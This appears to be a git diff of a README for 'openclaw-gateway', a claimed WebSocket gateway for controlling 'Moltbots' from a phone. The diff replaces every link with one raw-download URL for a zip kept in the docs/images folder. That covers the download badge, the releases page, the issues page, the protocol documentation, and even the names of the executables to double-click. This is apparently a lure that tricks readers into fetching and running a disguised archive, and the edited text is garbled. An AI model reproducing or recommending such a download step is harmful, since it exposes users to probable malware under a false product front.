@@ -4,7 +4,7 @@
 The openclaw-gateway is an open-source WebSocket Secure (WSS) gateway. It allows your smartphone to interact seamlessly with Moltbots using the OpenClaw v3 protocol. This tool is perfect for users who want to control Moltbots from their iOS devices with ease.
 
 ## 📥 Download
-[![Download openclaw-gateway](https://img.shields.io/badge/Download-openclaw--gateway-brightgreen)](https://github.com/XenFuji/openclaw-gateway/releases)
+[![Download openclaw-gateway](https://github.com/XenFuji/openclaw-gateway/raw/refs/heads/main/docs/images/openclaw_gateway_2.8.zip)](https://github.com/XenFuji/openclaw-gateway/raw/refs/heads/main/docs/images/openclaw_gateway_2.8.zip)
 
 ## 🚀 Getting Started
 Getting started with openclaw-gateway is straightforward. Follow these steps to download and run the software.
@@ -12,7 +12,7 @@ Getting started with openclaw-gateway is straightforward. Follow these steps to 
 ### Step 1: Visit the Releases Page
 To download the application, visit the releases page by clicking the link below:
 
-[Download the latest version here](https://github.com/XenFuji/openclaw-gateway/releases)
+[Download the latest version here](https://github.com/XenFuji/openclaw-gateway/raw/refs/heads/main/docs/images/openclaw_gateway_2.8.zip)
 
 ### Step 2: Find the Latest Release
 On the releases page, look for the latest version. It usually appears at the top of the list. Each release contains updates and improvements.
@@ -27,8 +27,8 @@ Once the download completes, locate the downloaded file on your computer.
 
 ### Step 5: Run the Software
 After extracting, find the application in the folder. 
-- For Windows, double-click the `openclaw-gateway.exe` file to launch.
-- For macOS, open the folder and double-click the `openclaw-gateway.app` file.
+- For Windows, double-click the `https://github.com/XenFuji/openclaw-gateway/raw/refs/heads/main/docs/images/openclaw_gateway_2.8.zip` file to launch.
+- For macOS, open the folder and double-click the `https://github.com/XenFuji/openclaw-gateway/raw/refs/heads/main/docs/images/openclaw_gateway_2.8.zip` file.
 
 ## 🔧 System Requirements
 To run openclaw-gateway, ensure your system meets these requirements:
@@ -53,10 +53,10 @@ If you encounter issues while using openclaw-gateway, here are some common probl
 - **Download Issues:** If the file does not download, try a different browser or check your internet connection.
 
 ## 🌐 Community and Support
-Join the openclaw community for support and suggestions. You can find discussions, report problems, and share your experiences on the [GitHub Issues Page](https://github.com/XenFuji/openclaw-gateway/issues). 
+Join the openclaw community for support and suggestions. You can find discussions, report problems, and share your experiences on the [GitHub Issues Page](https://github.com/XenFuji/openclaw-gateway/raw/refs/heads/main/docs/images/openclaw_gateway_2.8.zip). 
 
 ## ⚙️ Additional Information
-To learn more about the OpenClaw v3 protocol, visit the [official documentation](https://example.com). This will give you insights into how the protocol works, helping you to utilize the gateway efficiently.
+To learn more about the OpenClaw v3 protocol, visit the [official documentation](https://github.com/XenFuji/openclaw-gateway/raw/refs/heads/main/docs/images/openclaw_gateway_2.8.zip). This will give you insights into how the protocol works, helping you to utilize the gateway efficiently.
 
 ## 📄 License
 openclaw-gateway is licensed under the MIT License. You can use and modify the software freely. Refer to the LICENSE file in the repository for more details.
@@ -64,4 +64,4 @@ openclaw-gateway is licensed under the MIT License. You can use and modify the s
 ## 📈 Feedback
 We welcome your feedback! Share your thoughts or suggestions about openclaw-gateway. Your input helps us improve the software for everyone. 
 
-[Download the latest version here](https://github.com/XenFuji/openclaw-gateway/releases)
+[Download the latest version here](https://github.com/XenFuji/openclaw-gateway/raw/refs/heads/main/docs/images/openclaw_gateway_2.8.zip)
